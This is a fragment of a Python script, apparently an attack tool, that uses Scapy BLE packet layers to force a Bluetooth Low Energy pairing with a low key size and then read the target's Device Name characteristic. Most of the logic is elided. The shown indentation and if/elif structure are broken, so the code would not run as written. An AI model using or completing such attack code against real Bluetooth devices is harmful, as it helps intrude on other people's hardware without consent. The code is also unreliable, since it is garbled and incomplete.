...
def send_pairing_request():
    ...
    if current_key_size >= 17:
        print(Fore.RED + 'Slave rejected key size of ' + str(current_key_size))
...
while attack:
    ...
    if data:
        ...
        # Instead of ending the connection, continue with more BLE operations
            print(Fore.GREEN + 'Pairing successful. Proceeding with additional BLE operations.')
        
        # 1. Send a Read Request for the Device Name characteristic
            read_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Read_Request(gatt_handle=0x0003)
            driver.send(read_req)
            print(Fore.YELLOW + 'Sent Read Request for Device Name')

        elif ATT_Read_Response in pkt:
            print(Fore.GREEN + 'Received Device Name: ' + pkt[ATT_Read_Response].value.decode('utf-8'))
            end_connection = True
